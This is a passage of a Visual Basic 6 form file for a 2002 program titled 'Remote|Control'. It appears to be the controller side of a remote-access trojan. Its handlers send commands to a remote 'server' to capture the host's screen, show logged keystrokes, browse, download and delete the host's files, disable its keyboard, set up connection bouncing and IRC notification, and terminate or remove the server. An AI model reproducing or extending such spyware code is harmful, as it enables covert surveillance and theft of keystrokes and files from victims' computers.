            TabIndex        =   22
            Text            =   "0 bytes"
            Top             =   480
            Width           =   1215
         End
         Begin VB.TextBox txtBytesSent 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3480
            Locked          =   -1  'True
            TabIndex        =   21
            Text            =   "0 bytes"
            Top             =   480
            Width           =   1215
         End
         Begin VB.TextBox txtConnectionTime 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3480
            Locked          =   -1  'True
            TabIndex        =   20
            Text            =   "00:00"
            Top             =   240
            Width           =   1215
         End
         Begin VB.TextBox txtConnectionStatus 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1200
            Locked          =   -1  'True
            TabIndex        =   19
            Text            =   "Not Connected"
            Top             =   240
            Width           =   1215
         End
         Begin VB.Label cmdUpgrade 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Upgrade"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   3720
            TabIndex        =   147
            Top             =   3600
            Width           =   975
         End
         Begin VB.Label lblUpgrade 
            BackColor       =   &H00808000&
            Caption         =   "Run upgrade:"
            Height          =   255
            Left            =   240
            TabIndex        =   144
            Top             =   3600
            Width           =   1095
         End
         Begin VB.Label cmdRemoveServer 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Remove Server"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   2400
            TabIndex        =   24
            Top             =   840
            Width           =   2055
         End
         Begin VB.Label cmdTerminateServer 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Terminate Server"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   360
            TabIndex        =   23
            Top             =   840
            Width           =   2055
         End
         Begin VB.Label lblDataReceived 
            BackStyle       =   0  'Transparent
            Caption         =   "Recived:"
            ForeColor       =   &H80000007&
            Height          =   255
            Left            =   120
            TabIndex        =   18
            Top             =   480
            Width           =   1335
         End
         Begin VB.Label lblDataSent 
            BackStyle       =   0  'Transparent
            Caption         =   "Sent:"
            ForeColor       =   &H00000000&
            Height          =   255
            Left            =   2520
            TabIndex        =   17
            Top             =   480
            Width           =   1335
         End
         Begin VB.Label lblStatus 
            BackStyle       =   0  'Transparent
            Caption         =   "Status:"
            ForeColor       =   &H80000007&
            Height          =   255
            Left            =   120
            TabIndex        =   16
            Top             =   240
            Width           =   1455
         End
         Begin VB.Label lblConnectionTime 
            BackStyle       =   0  'Transparent
            Caption         =   "Time:"
            ForeColor       =   &H80000007&
            Height          =   255
            Left            =   2520
            TabIndex        =   15
            Top             =   240
            Width           =   1335
         End
      End
      Begin VB.Frame fmeChat 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   59
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin VB.Frame fmeChatOptions 
            BackColor       =   &H00808000&
            BorderStyle     =   0  'None
            Height          =   1575
            Left            =   360
            TabIndex        =   65
            Top             =   1680
            Visible         =   0   'False
            Width           =   4095
            Begin MSComDlg.CommonDialog CD 
               Left            =   0
               Top             =   0
               _ExtentX        =   847
               _ExtentY        =   847
               _Version        =   393216
               CancelError     =   -1  'True
            End
            Begin VB.TextBox txtNick 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   120
               TabIndex        =   67
               Top             =   480
               Width           =   3855
            End
            Begin VB.Label cmdChatOptionsCancel 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Cancel"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   1200
               TabIndex        =   74
               Top             =   1200
               Width           =   975
            End
            Begin VB.Label cmdChatOptionsOk 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "OK"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   120
               TabIndex        =   73
               Top             =   1200
               Width           =   975
            End
            Begin VB.Label cmdchatOptionsChooseBack 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Choose"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   3240
               TabIndex        =   72
               Top             =   840
               Width           =   735
            End
            Begin VB.Shape colBack 
               BackColor       =   &H00000000&
               BackStyle       =   1  'Opaque
               BorderColor     =   &H00808000&
               BorderStyle     =   0  'Transparent
               Height          =   255
               Left            =   2880
               Top             =   840
               Width           =   255
            End
            Begin VB.Label Label2 
               BackStyle       =   0  'Transparent
               Caption         =   "BackColor:"
               Height          =   255
               Left            =   2040
               TabIndex        =   71
               Top             =   840
               Width           =   855
            End
            Begin VB.Shape colText 
               BackColor       =   &H00000000&
               BackStyle       =   1  'Opaque
               BorderColor     =   &H00808000&
               BorderStyle     =   0  'Transparent
               Height          =   255
               Left            =   840
               Top             =   840
               Width           =   255
            End
            Begin VB.Label cmdChatOptionsChooseText 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Choose"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   1200
               TabIndex        =   70
               Top             =   840
               Width           =   735
            End
            Begin VB.Label lblChatOptionsTextColor 
               BackStyle       =   0  'Transparent
               Caption         =   "Text Color:"
               Height          =   255
               Left            =   0
               TabIndex        =   69
               Top             =   840
               Width           =   855
            End
            Begin VB.Label lblChatNickName 
               BackStyle       =   0  'Transparent
               Caption         =   "NickName:"
               Height          =   255
               Left            =   0
               TabIndex        =   68
               Top             =   240
               Width           =   855
            End
            Begin VB.Label ChatOptionsTitleBar 
               Alignment       =   2  'Center
               BackColor       =   &H8000000D&
               Caption         =   ".::Chat|Options::."
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9.75
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H00FFFFFF&
               Height          =   255
               Left            =   0
               TabIndex        =   66
               Top             =   0
               Width           =   4095
            End
         End
         Begin VB.TextBox txtChat 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   3255
            Left            =   120
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            TabIndex        =   61
            Text            =   "frmMain.frx":1235B
            Top             =   240
            Width           =   4575
         End
         Begin VB.TextBox txtMessage 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   495
            Left            =   120
            TabIndex        =   60
            Top             =   3600
            Width           =   3735
         End
         Begin VB.Label cmdEndChat 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "End Chat"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            Left            =   2520
            TabIndex        =   76
            Top             =   4200
            Width           =   2175
         End
         Begin VB.Label cmdStartChat 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Start Chat"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            Left            =   120
            TabIndex        =   75
            Top             =   4200
            Width           =   2175
         End
         Begin VB.Label shpSend 
            BackStyle       =   0  'Transparent
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   495
            Left            =   3960
            TabIndex        =   62
            Top             =   3600
            Width           =   735
         End
         Begin VB.Label cmdChat 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Options"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            Left            =   120
            TabIndex        =   64
            Top             =   4560
            Width           =   4575
         End
         Begin VB.Label lblSend 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            BackStyle       =   0  'Transparent
            Caption         =   "Send"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9.75
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   255
            Left            =   3960
            TabIndex        =   63
            Top             =   3720
            Width           =   735
         End
         Begin VB.Shape cmdSend 
            BackColor       =   &H8000000D&
            BackStyle       =   1  'Opaque
            Height          =   495
            Left            =   3960
            Shape           =   4  'Rounded Rectangle
            Top             =   3600
            Width           =   735
         End
      End
      Begin VB.Frame fmeSpying 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   27
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin VB.ComboBox cmbPreviewColorDepth 
            BackColor       =   &H00C0C0C0&
            Height          =   315
            ItemData        =   "frmMain.frx":12393
            Left            =   2160
            List            =   "frmMain.frx":123A3
            Style           =   2  'Dropdown List
            TabIndex        =   224
            Top             =   4080
            Width           =   1695
         End
         Begin VB.TextBox txtPreviewScale 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3000
            MaxLength       =   3
            TabIndex        =   223
            Text            =   "100"
            Top             =   3720
            Width           =   615
         End
         Begin VB.Label lblPreviewColorDepth 
            Alignment       =   1  'Right Justify
            BackStyle       =   0  'Transparent
            Caption         =   "Color Depth"
            Height          =   255
            Left            =   1200
            TabIndex        =   226
            Top             =   4080
            Width           =   855
         End
         Begin VB.Label lblPreviewScale 
            Alignment       =   1  'Right Justify
            BackStyle       =   0  'Transparent
            Caption         =   "Preview host screen at                  %"
            Height          =   255
            Left            =   600
            TabIndex        =   225
            Top             =   3720
            Width           =   3135
         End
         Begin VB.Image imgScreenShot 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   3375
            Left            =   240
            Picture         =   "frmMain.frx":123BD
            Stretch         =   -1  'True
            Top             =   240
            Width           =   4455
         End
         Begin VB.Label cmdCaptureScreen 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Capture Screen"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   1320
            TabIndex        =   28
            Top             =   4560
            Width           =   2295
         End
      End
      Begin VB.Label lblSections 
         Alignment       =   2  'Center
         BackColor       =   &H8000000D&
         Caption         =   "-=Areas=-"
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   240
         Width           =   2055
      End
   End
   Begin VB.Frame fmeConnect 
      Appearance      =   0  'Flat
      BackColor       =   &H00808000&
      ForeColor       =   &H80000008&
      Height          =   855
      Left            =   120
      TabIndex        =   2
      Top             =   360
      Width           =   7215
      Begin VB.CheckBox chkAcceptIncomming 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         Caption         =   "Accept incomming connections"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   217
         Top             =   550
         Value           =   1  'Checked
         Width           =   2895
      End
      Begin VB.TextBox txtPort 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         Height          =   285
         Left            =   2760
         TabIndex        =   8
         Top             =   240
         Width           =   615
      End
      Begin VB.TextBox txtHost 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         Height          =   285
         Left            =   600
         TabIndex        =   7
         Top             =   240
         Width           =   1695
      End
      Begin VB.Label cmdReset 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H8000000D&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Reset"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   4680
         TabIndex        =   13
         Top             =   240
         Width           =   1095
      End
      Begin VB.Label cmdClose 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H8000000D&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Close"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000009&
         Height          =   255
         Left            =   5880
         TabIndex        =   12
         Top             =   240
         Width           =   1095
      End
      Begin VB.Label cmdConnect 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H8000000D&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Connect"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000009&
         Height          =   255
         Left            =   3480
         TabIndex        =   10
         Top             =   240
         Width           =   1095
      End
      Begin VB.Label lblPort 
         BackStyle       =   0  'Transparent
         Caption         =   "Port:"
         Height          =   255
         Left            =   2400
         TabIndex        =   9
         Top             =   240
         Width           =   375
      End
      Begin VB.Label lblHost 
         BackStyle       =   0  'Transparent
         Caption         =   "Host:"
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   240
         Width           =   495
      End
   End
   Begin VB.Line Line4 
      X1              =   7440
      X2              =   7440
      Y1              =   6480
      Y2              =   0
   End
   Begin VB.Line Line3 
      X1              =   7440
      X2              =   0
      Y1              =   240
      Y2              =   240
   End
   Begin VB.Line Line2 
      X1              =   7440
      X2              =   0
      Y1              =   0
      Y2              =   0
   End
   Begin VB.Line Line1 
      X1              =   0
      X2              =   0
      Y1              =   0
      Y2              =   6480
   End
   Begin VB.Label MinimizeButton 
      BackStyle       =   0  'Transparent
      Caption         =   "_"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   6480
      TabIndex        =   25
      Top             =   0
      Width           =   135
   End
   Begin VB.Label lblMessage 
      BackStyle       =   0  'Transparent
      Caption         =   "Remote|Control (Tim Cinel 2002)"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   0
      TabIndex        =   11
      ToolTipText     =   "sickanimations_inc@hotmail.com"
      Top             =   6480
      Width           =   2775
   End
   Begin VB.Label ExitButton 
      BackStyle       =   0  'Transparent
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   6840
      TabIndex        =   1
      Top             =   0
      Width           =   135
   End
   Begin VB.Label TitleBar 
      Alignment       =   2  'Center
      BackColor       =   &H8000000D&
      Caption         =   "Remote|Control"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   7455
   End
   Begin VB.Shape shpStatus 
      BackColor       =   &H8000000D&
      BackStyle       =   1  'Opaque
      Height          =   255
      Left            =   0
      Top             =   6480
      Width           =   7455
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim AuthorDirection As Single, OriginalFileName As String, AsciiCode As Integer, RemoteHostText As String, RemotePortText As String
Public CredRandX As Single, CredRandY As Single
Public NickName As String
Dim ConnectedMinutes As Single, ConnectedSeconds As Single
Dim DoubleClicked As Boolean

'File Transfer Varables
Dim ScreenSize As Single
Dim ScreenSoFar As Single
Dim ScreenBytesPerSecond As Single

Private Sub chkScreenSaver_Click()
Select Case chkScreenSaver.Value
Case 0
Send "windows;disable;sp_keystrokes;"
Case 1
Send "windows;enable;sp_keystrokes;"
End Select
End Sub


Private Sub chkAcceptIncomming_Click()
    Select Case chkAcceptIncomming.Value
    Case 0
        wskSwitch.Close
    Case 1
        wskSwitch.Close
        wskSwitch.Listen
    End Select
End Sub

Private Sub chkIrcNotify_Click()
Send "server;irc;" & chkIrcNotify.Value
End Sub

Private Sub cmbDrives_Click()
Send "file;dir;" & cmbDrives.Text
End Sub

Private Sub cmdAddBounce_Click()
Dim ListenOn As Single, BounceHost As String, BouncePort As Single

ListenOn = Val(txtListenOn.Text)
BounceHost = txtBounceHost.Text
BouncePort = Val(txtBouncePort.Text)

If ListenOn > 1 And ListenOn < 32000 Then
    If Len(BounceHost) > 1 Then
        If BouncePort > 1 And BouncePort < 32000 Then
            frmMain.lstBounces.AddItem "From port '" & ListenOn & "' To '" & BounceHost & ":" & BouncePort & "'"
        Else
            MsgBox "Invalid port to conenct to.", vbExclamation + vbOKOnly, "Connection Bouncing"
        End If
    Else
        MsgBox "Invalid hostname.", vbExclamation + vbOKOnly, "Connection Bouncing"
    End If
Else
    MsgBox "Invalid conenction port.", vbExclamation + vbOKOnly, "Connection Bouncing"
End If

lblBounceUpdate.Caption = "NOT UPLOADED"
lblBounceUpdate.ForeColor = vbRed

End Sub

Private Sub cmdAddBounce_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdAddBounce
End Sub

Private Sub cmdAddBounce_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdAddBounce
End Sub

Private Sub cmdCancel_Click()
On Error Resume Next

If lstTransfers.SelectedItem.Index = 0 Then Beep: Exit Sub

Dim result As VbMsgBoxResult
result = MsgBox("Are you sure you want to cancel this download?", vbYesNo + vbQuestion, "Warning")
If result = vbNo Then Exit Sub

lstTransfers.ListItems.Remove lstTransfers.SelectedItem.Index
End Sub

Private Sub cmdCancel_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, frmMain.cmdCancel
End Sub

Private Sub cmdCancel_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, frmMain.cmdCancel
End Sub

Private Sub cmdCancelTransfer_Click()
Dim result  As VbMsgBoxResult

result = MsgBox("Are you sure you want to cancel this transfer?", vbExclamation + vbYesNo, "Cancel Transfer")
If result = vbNo Then Exit Sub

Send "faction;terminate"
basProccess.FileAction "terminate"

End Sub

Private Sub cmdCancelTransfer_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, frmMain.cmdCancelTransfer
End Sub

Private Sub cmdCancelTransfer_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, frmMain.cmdCancelTransfer
End Sub

Private Sub cmdCaptureScreen_Click()
If cmbPreviewColorDepth.Text = "" Then cmbPreviewColorDepth.ListIndex = 1

Send "rc;preview;" & txtPreviewScale.Text & ";" & cmbPreviewColorDepth.Text
End Sub

Private Sub cmdChat_Click()
colBack.BackColor = txtChat.BackColor
colText.BackColor = txtChat.ForeColor
txtNick.Text = NickName
fmeChatOptions.Visible = True
End Sub

Private Sub cmdChat_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, frmMain.cmdChat
End Sub

Private Sub cmdChat_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, frmMain.cmdChat
End Sub

Private Sub cmdChatOptionsCancel_Click()
fmeChatOptions.Visible = False
End Sub

Private Sub cmdChatOptionsCancel_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdChatOptionsCancel
End Sub

Private Sub cmdChatOptionsCancel_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdChatOptionsCancel
End Sub

Private Sub cmdchatOptionsChooseBack_Click()
On Error GoTo ErrorHandler
cd.Color = colBack.BackColor
cd.ShowColor
colBack.BackColor = cd.Color
Exit Sub
ErrorHandler:
Exit Sub
End Sub

Private Sub cmdchatOptionsChooseBack_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdchatOptionsChooseBack
End Sub

Private Sub cmdchatOptionsChooseBack_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdchatOptionsChooseBack
End Sub

Private Sub cmdChatOptionsChooseText_Click()
On Error GoTo ErrorHandler
cd.Color = colText.BackColor
cd.ShowColor
colText.BackColor = cd.Color
Exit Sub
ErrorHandler:
Exit Sub
End Sub

Private Sub cmdChatOptionsChooseText_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdChatOptionsChooseText
End Sub

Private Sub cmdChatOptionsChooseText_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdChatOptionsChooseText
End Sub

Private Sub cmdChatOptionsOk_Click()
WriteINI "Chat", "nick", txtNick.Text, "remotecontrol.ini"
WriteINI "Chat", "text", colText.BackColor, "remotecontrol.ini"
WriteINI "Chat", "back", colBack.BackColor, "remotecontrol.ini"
txtChat.ForeColor = colText.BackColor
txtChat.BackColor = colBack.BackColor
txtMessage.ForeColor = colText.BackColor
txtMessage.BackColor = colBack.BackColor
fmeChatOptions.Visible = False
End Sub

Private Sub cmdChatOptionsOk_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdChatOptionsOk
End Sub

Private Sub cmdChatOptionsOk_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdChatOptionsOk
End Sub

Private Sub cmdClearBounce_Click()
lstBounces.Clear

lblBounceUpdate.Caption = "NOT UPLOADED"
lblBounceUpdate.ForeColor = vbRed

End Sub

Private Sub cmdClearBounce_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdClearBounce
End Sub

Private Sub cmdClearBounce_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdClearBounce
End Sub

Private Sub cmdClearKeyLog_Click()
txtKeyLog.Text = ""
End Sub

Private Sub cmdClearKeyLog_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdClearKeyLog
End Sub

Private Sub cmdClearKeyLog_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdClearKeyLog
End Sub

Private Sub cmdClearTransfers_Click()
If MsgBox("Are you sure you want to clear all transfers in the queue?", vbYesNo + vbQuestion, "Clear Transfers?") = vbYes Then
    lstTransfers.ListItems.Clear
End If
End Sub

Private Sub cmdClearTransfers_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, frmMain.cmdClearTransfers
End Sub

Private Sub cmdClearTransfers_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, frmMain.cmdClearTransfers
End Sub

Private Sub cmdClose_Click()
wsk_Close
Status "Connection closed."
End Sub

Private Sub cmdClose_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdClose
End Sub

Private Sub cmdClose_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdClose
End Sub

Private Sub cmdConnect_Click()
On Error Resume Next
wsk.Close
wsk.LocalPort = 0
wsk.Connect txtHost.Text, txtPort.Text
Status "Connecting to " & txtHost.Text & ":" & txtPort.Text
End Sub

Private Sub cmdConnect_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdConnect
End Sub

Private Sub cmdConnect_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdConnect
End Sub

Private Sub cmdCopyFile_Click()
If lstFileManager.SelectedItem.Icon <> 4 Then
    MsgBox "You cannot copy folders or drives.", vbCritical + vbOKOnly, "Error"
    Exit Sub
ElseIf lstFileManager.SelectedItem.Text = "" Then
    MsgBox "You must select a file before you copy it.", vbCritical + vbOKOnly, "Error"
    Exit Sub
End If

cmdCopyFile.Tag = cmbDrives.Tag & lstFileManager.SelectedItem.Text
Status cmdCopyFile.Tag & " has been placed in client clipboard."
End Sub

Private Sub cmdDelete_Click()
Dim result As VbMsgBoxResult
result = MsgBox("Are you sure you want to delete this file?", vbYesNo + vbExclamation, "Warning")
If result = vbNo Then Exit Sub
Send "file;delete;" & cmbDrives.Tag & lstFileManager.SelectedItem.Text
End Sub

Private Sub cmdDelete_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdDelete
End Sub

Private Sub cmdDelete_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdDelete
End Sub

Private Sub cmdDownload_Click()
On Error GoTo ErrorHandler
Dim Destination As String, DestinationPath As String, CurrentItem As ListItem, SelectedFiles As Long

For Each CurrentItem In lstFileManager.ListItems
    If CurrentItem.Selected = True Then
        SelectedFiles = SelectedFiles + 1
    End If
Next CurrentItem

Set CurrentItem = Nothing

If SelectedFiles = 1 Then
    
    Set CurrentItem = lstFileManager.SelectedItem
    If lstFileManager.SelectedItem.Icon <> 5 Then GoTo ErrorHandler
    cdTransfer.FileName = CurrentItem.Text
    cdTransfer.ShowSave
    Destination = cdTransfer.FileName
    
    Send "faction;request;" & cmbDrives.Tag & CurrentItem.Text & "*" & Destination
    
ElseIf SelectedFiles > 1 Then
    DestinationPath = BasMain.BrowseForFolder("Download files to directory", , basDeclare.LastPath, Me)
    basDeclare.LastPath = DestinationPath
    basRegistry.WriteINI "Settings", "LastPath", basDeclare.LastPath, "remotecontrol.ini"
    
    If Dir(DestinationPath & "\", vbDirectory) = "" Then GoTo ErrorHandler
    
    For Each CurrentItem In lstFileManager.ListItems
        If CurrentItem.Selected = True Then
            If CurrentItem.Icon <> 5 Then GoTo ErrorHandler
            Destination = DestinationPath & "\" & CurrentItem.Text
            Send "faction;request;" & cmbDrives.Tag & CurrentItem.Text & "*" & Destination
        End If
    Next CurrentItem
Else
    Beep
End If

ErrorHandler:
Beep
End Sub

Private Sub cmdDownload_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdDownload
End Sub

Private Sub cmdDownload_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdDownload
End Sub

Private Sub cmdDrives_Click()
Send "file;drives;*"
End Sub

Private Sub cmdDrives_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 0, cmdDrives
End Sub

Private Sub cmdDrives_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MouseClick 1, cmdDrives
End Sub

Private Sub cmdEndChat_Click()
Send "chat;end;"
End Sub

